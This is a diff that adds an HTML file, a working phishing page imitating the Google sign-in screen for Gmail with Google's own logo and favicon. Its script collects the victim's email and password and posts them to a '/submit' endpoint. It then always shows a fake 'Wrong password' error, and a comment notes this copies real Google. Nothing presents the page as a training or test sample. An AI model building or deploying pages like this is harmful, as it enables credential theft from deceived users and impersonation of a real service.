@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Google Sign In</title>
+  <link rel="icon" href="https://ssl.gstatic.com/images/branding/product/1x/contacts_48dp.png">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      max-width: 400px;
+      margin: 50px auto;
+      padding: 20px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+    }
+    img {
+      display: block;
+      margin: 0 auto 20px;
+      height: 32px;
+    }
+    input, button {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      box-sizing: border-box;
+    }
+    input {
+      border: 1px solid #ddd;
+      border-radius: 4px;
+    }
+    button {
+      background: #1a73e8;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .error {
+      color: #d93025;
+      font-size: 14px;
+      margin-top: 10px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg">
+  <h2>Sign in</h2>
+  <p>to continue to Gmail</p>
+  
+  <form id="loginForm">
+    <input type="text" name="email" placeholder="Email or phone" required>
+    <input type="password" name="password" placeholder="Enter your password" required>
+    <button type="submit">Next</button>
+    <div class="error" id="error">Wrong password. Try again.</div>
+  </form>
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      
+      const formData = {
+        email: this.email.value,
+        password: this.password.value
+      };
+      
+      const errorElement = document.getElementById('error');
+      const button = this.querySelector('button');
+      
+      // Show loading state
+      button.disabled = true;
+      button.textContent = 'Checking...';
+      
+      fetch('/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(formData)
+      })
+      .then(response => {
+        if (!response.ok) throw new Error();
+        // Show error message (like real Google)
+        errorElement.style.display = 'block';
+        this.password.value = '';
+        button.disabled = false;
+        button.textContent = 'Next';
+      })
+      .catch(err => {
+        errorElement.style.display = 'block';
+        button.disabled = false;
+        button.textContent = 'Next';
+      });
+    });
+  </script>
+</body>
+  </html>
